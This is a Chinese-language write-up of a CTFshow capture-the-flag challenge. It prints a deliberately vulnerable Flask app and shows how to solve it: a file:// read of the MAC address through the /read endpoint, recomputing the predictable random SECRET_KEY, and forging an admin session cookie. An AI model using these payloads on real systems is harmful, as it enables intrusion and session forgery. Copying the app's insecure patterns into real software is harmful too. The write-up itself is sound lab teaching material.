# 例子

```python
# encoding:utf-8
import re
import random
import uuid
import urllib.request
from flask import Flask, session, request

app = Flask(__name__)

# 随机生成一个 SECRET_KEY
random.seed(uuid.getnode())
app.config['SECRET_KEY'] = str(random.random() * 100)
print(app.config['SECRET_KEY'])

app.debug = False


@app.route('/')
def index():
    session['username'] = 'guest'
    return 'CTFshow 网页爬虫系统 读取网页'


@app.route('/read')
def read():
    try:
        url = request.args.get('url')
        if re.findall('flag', url, re.IGNORECASE):
            return '禁止访问'
        res = urllib.request.urlopen(url)
        return res.read().decode('utf-8', errors='ignore')
    except Exception as ex:
        print(str(ex))
        return '无读取内容可以展示'


@app.route('/flag')
def flag():
    if session.get('username') == 'admin':
        return open('/flag.txt', encoding='utf-8').read()
    else:
        return '访问受限'


if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")

```

可以看到想要拿到flag需要使用admin的session
那么我们看到session的生成方式用的是random的函数，我们可以伪造session

Python `random.random()` 是确定性的，种子相同，输出完全相同，只要读取到机器MAC地址，就可以精准计算出密钥

这个题使用mac来生成种子的
读取机器码

```
read?url=file:///sys/class/net/eth0/address
```

拿到机器码`02:42:ac:0c:fc:3d`

计算密钥`SECRET_KEY`

```python
import random

mac = int("02:42:ac:0c:fc:3d".replace(":",""),16) # 已知的 MAC 地址
random.seed(mac)
key = str(random.random()*100)
print(key) # 79.43065193591464
```
使用[【flask-session-cookie-manager】 (opens new window)](https://github.com/noraj/flask-session-cookie-manager)来伪造seesion

```
python3 .\flask_session_cookie_manager3.py decode -s "79.43065193591464"  -c "eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLg2YA.Bq9NjyH26PAyzl3YjpBKIIgHOVQ"

python3 .\flask_session_cookie_manager3.py encode -s "79.43065193591464" -t "{'username':'admin'}"
```

更换session访问`/flag`拿到flag
